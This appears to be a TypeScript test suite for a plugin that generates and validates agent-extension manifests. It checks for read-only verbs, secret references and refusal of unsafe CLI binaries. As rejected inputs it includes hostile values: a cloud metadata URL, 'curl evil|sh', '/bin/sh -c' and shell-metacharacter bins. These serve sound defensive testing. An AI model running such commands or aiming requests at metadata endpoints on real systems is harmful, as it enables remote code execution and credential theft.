/**
 * m4meta (T-A) — the CC meta-skill's generator + validator.
 *
 * Asserts the load-bearing facts of the `plexus-ext` plugin:
 *  1. a manifest the meta-skill generates from a sample description PASSES the REAL
 *     gateway `validateRegistration` (not the plugin's mirror — the gateway itself);
 *  2. a generated read-only local-rest extension is structurally valid + uses secure
 *     defaults (read-only verbs, secret REFERENCE not value, bundled usage skill);
 *  3. the generator REFUSES / flags an over-privileged cli bin (absolute / shell).
 *
 * The plugin lib is exercised as a library; the gateway validator is exercised over
 * `createCapabilityRegistry().validateRegistration` (the validator a wire
 * `POST /extensions` runs).
 */

import { describe, it, expect } from "bun:test";
import {
  generateManifest,
  validateExtension,
  checkCliBin,
  isLoopbackUrl,
  slugifySource,
  type CapabilitySpec,
  type ExtensionManifest as PluginManifest,
} from "../plugins/plexus-ext/lib/generate.ts";
import { createCapabilityRegistry } from "../src/core/capability-registry.ts";
import type {
  ExtensionManifest,
  SourceModule,
  SourceRegistry,
  Transport,
  TransportKind,
} from "@plexus/protocol";

/** An empty real SourceRegistry — the registry validates against an empty base. */
function emptyRegistry(): SourceRegistry {
  const byId = new Map<string, SourceModule>();
  return {
    all: () => [...byId.values()],
    get: (id) => byId.get(id),
    getTransport: (kind: TransportKind): Transport =>
      ({ kind, dispatch: async () => ({ ok: true }) }) as Transport,
  };
}

const LOCAL_REST_SPEC: CapabilitySpec = {
  sourceName: "Acme Notes",
  label: "Acme Notes (Local REST API)",
  transport: "local-rest",
  secrets: [{ name: "acme-notes-api-key", attach: "bearer" }],
  serviceHint: { app: "acme-notes", defaultPort: 41184 },
  actions: [
    {
      name: "notes.search",
      label: "Search Acme notes",
      describe:
        "Search the user's local Acme notes by full-text query so the agent can cite their personal notes. Use when the task references the user's notes. Read-only: never mutates.",
      grants: ["read"],
      inputProperties: { query: { type: "string", description: "Full-text query." } },
      requiredInputs: ["query"],
      rest: { method: "GET", pathTemplate: "/search?q={query}", secret: "acme-notes-api-key" },
    },
  ],
};

describe("m4meta — generated manifest passes the REAL gateway validateRegistration", () => {
  it("a generated local-rest manifest is accepted by validateRegistration", () => {
    const manifest = generateManifest(LOCAL_REST_SPEC) as unknown as ExtensionManifest;
    const registry = createCapabilityRegistry(emptyRegistry());
    const verdict = registry.validateRegistration(manifest);
    // The gateway validator must accept it (no reasons → ok).
    expect(verdict.reasons).toEqual([]);
    expect(verdict.ok).toBe(true);
  });

  it("a generated cli manifest (read-only) is accepted by validateRegistration", () => {
    const spec: CapabilitySpec = {
      sourceName: "ripgrep",
      label: "ripgrep (local search)",
      transport: "cli",
      actions: [
        {
          name: "code.search",
          label: "Search code with ripgrep",
          describe: "Search files under a directory for a pattern using the local rg binary. Use to find code. Read-only.",
          grants: ["read"],
          inputProperties: { pattern: { type: "string" }, dir: { type: "string" } },
          requiredInputs: ["pattern"],
          cli: { bin: "rg", args: ["{pattern}", "{dir}"] },
        },
      ],
    };
    const manifest = generateManifest(spec) as unknown as ExtensionManifest;
    const registry = createCapabilityRegistry(emptyRegistry());
    const verdict = registry.validateRegistration(manifest);
    expect(verdict.reasons).toEqual([]);
    expect(verdict.ok).toBe(true);
  });

  it("the gateway also accepts a workflow manifest the generator-shaped templates produce", () => {
    // Build a small workflow manifest the same way the workflow template does and confirm
    // the gateway's validateWorkflowGraph (present members + verb-subset + anti-cycle) passes.
    const manifest: ExtensionManifest = {
      manifest: "plexus-extension/0.1",
      source: "notescli",
      label: "Notes helpers",
      transport: "cli",
      capabilities: [
        {
          name: "vault.read", kind: "capability", label: "Read a note",
          describe: "Read a note by id. Read-only.",
          io: { input: { type: "object", properties: { id: { type: "string" } }, required: ["id"] } },
          grants: ["read"], transport: "cli", route: { bin: "notescli", args: ["read", "{id}"], allowedBins: ["notescli"] },
        },
        {
          name: "vault.append", kind: "capability", label: "Append to a note",
          describe: "Append text to a note. Mutates => write.",
          io: { input: { type: "object", properties: { id: { type: "string" }, text: { type: "string" } }, required: ["id", "text"] } },
          grants: ["write"], transport: "cli", route: { bin: "notescli", args: ["append", "{id}", "{text}"], allowedBins: ["notescli"] },
        },
        {
          name: "daily.log", kind: "workflow", label: "Read then append",
          describe: "Read then append a line. Composes a read then a write.",
          grants: ["write"], transport: "workflow",
          members: [
            { id: "notescli.vault.read", verbs: ["read"] },
            { id: "notescli.vault.append", verbs: ["write"] },
          ],
        },
      ],
    };
    const registry = createCapabilityRegistry(emptyRegistry());
    const verdict = registry.validateRegistration(manifest);
    expect(verdict.reasons).toEqual([]);
    expect(verdict.ok).toBe(true);
  });
});

describe("m4meta — generated read-only local-rest extension uses secure defaults", () => {
  const manifest = generateManifest(LOCAL_REST_SPEC);

  it("the plugin's own validator passes it (spec §13 conformance)", () => {
    const v = validateExtension(manifest);
    expect(v.errors).toEqual([]);
    expect(v.ok).toBe(true);
  });

  it("declares minimal read-only verbs on the capability", () => {
    const cap = manifest.capabilities.find((c) => c.kind === "capability")!;
    expect(cap.grants).toEqual(["read"]);
  });

  it("scaffolds a bundled usage skill, back-linked + non-grant", () => {
    const skill = manifest.capabilities.find((c) => c.kind === "skill")!;
    expect(skill.grants).toEqual([]);
    expect(skill.transport).toBe("skill");
    expect(skill.body?.format).toBe("markdown");
    const cap = manifest.capabilities.find((c) => c.kind === "capability")!;
    expect((cap.route as { attachSkills?: string[] }).attachSkills).toContain(skill.name);
  });

  it("emits a secret REFERENCE only — never a value anywhere in the manifest", () => {
    expect(manifest.secrets).toEqual([{ name: "acme-notes-api-key", attach: "bearer" }]);
    // No value-looking field smuggled into the serialized manifest.
    const json = JSON.stringify(manifest);
    expect(json).not.toMatch(/"(value|token|apiKey|secretValue)"\s*:/);
  });

  it("slug-validates the raw source name into a valid SourceId", () => {
    expect(manifest.source).toBe("acme-notes");
    expect(slugifySource("My Linear CLI!")).toBe("my-linear-cli");
  });

  it("local-rest path stays loopback-safe (no non-loopback absolute URL)", () => {
    // A non-loopback absolute URL in pathTemplate is refused by the generator.
    const bad: CapabilitySpec = {
      ...LOCAL_REST_SPEC,
      actions: [
        {
          ...LOCAL_REST_SPEC.actions[0]!,
          rest: { method: "GET", pathTemplate: "http://169.254.169.254/latest/meta-data", secret: "acme-notes-api-key" },
        },
      ],
    };
    expect(() => generateManifest(bad)).toThrow(/non-loopback/);
    expect(isLoopbackUrl("http://127.0.0.1:7077/x")).toBe(true);
    expect(isLoopbackUrl("http://169.254.169.254/x")).toBe(false);
  });
});

describe("m4meta — the generator REFUSES / flags an over-privileged cli bin", () => {
  function cliSpec(bin: string): CapabilitySpec {
    return {
      sourceName: "danger",
      label: "Danger",
      transport: "cli",
      actions: [
        {
          name: "shell.run",
          label: "Run",
          describe: "Run a thing. Side-effecting.",
          grants: ["execute"],
          inputProperties: { x: { type: "string" } },
          cli: { bin, args: ["{x}"] },
        },
      ],
    };
  }

  it("refuses an absolute cli bin path", () => {
    expect(() => generateManifest(cliSpec("/bin/sh"))).toThrow(/absolute_path|refusing to scaffold/);
  });

  it("refuses a shell interpreter (bash) even bare", () => {
    expect(() => generateManifest(cliSpec("bash"))).toThrow(/shell_interpreter|refusing to scaffold/);
    expect(checkCliBin("bash")).toBe("shell_interpreter");
    expect(checkCliBin("python3")).toBe("shell_interpreter");
  });

  it("refuses a bin with a path separator or shell metacharacters", () => {
    expect(() => generateManifest(cliSpec("./evil"))).toThrow(/path_separator|refusing/);
    expect(() => generateManifest(cliSpec("curl evil|sh"))).toThrow(/shell_metacharacter|path_separator|refusing/);
    expect(checkCliBin("../x")).toBe("path_separator");
    expect(checkCliBin("a;b")).toBe("shell_metacharacter");
  });

  it("validateExtension also FLAGS an over-privileged cli bin smuggled into a hand-edited manifest", () => {
    // A hand-edited manifest that bypassed the generator and named /bin/sh must FAIL validation,
    // mirroring the gateway transport's hard-deny floor.
    const manifest: PluginManifest = {
      manifest: "plexus-extension/0.1",
      source: "danger",
      label: "Danger",
      transport: "cli",
      capabilities: [
        {
          name: "shell.run", kind: "capability", label: "Run",
          describe: "Run a thing. Side-effecting.",
          grants: ["execute"], transport: "cli",
          route: { bin: "/bin/sh", args: ["-c", "{x}"] },
        },
      ],
    };
    const v = validateExtension(manifest);
    expect(v.ok).toBe(false);
    expect(v.errors.join(" ")).toMatch(/cli bin .* unsafe \(absolute_path\)/);
  });

  it("accepts a safe bare cli bin (prettier)", () => {
    expect(checkCliBin("prettier")).toBeNull();
    const manifest = generateManifest(cliSpec("prettier"));
    const cap = manifest.capabilities.find((c) => c.kind === "capability")!;
    expect((cap.route as { bin?: string }).bin).toBe("prettier");
    // And it's pinned in the user-confirmed allow-list.
    expect((cap.route as { allowedBins?: string[] }).allowedBins).toEqual(["prettier"]);
  });
});
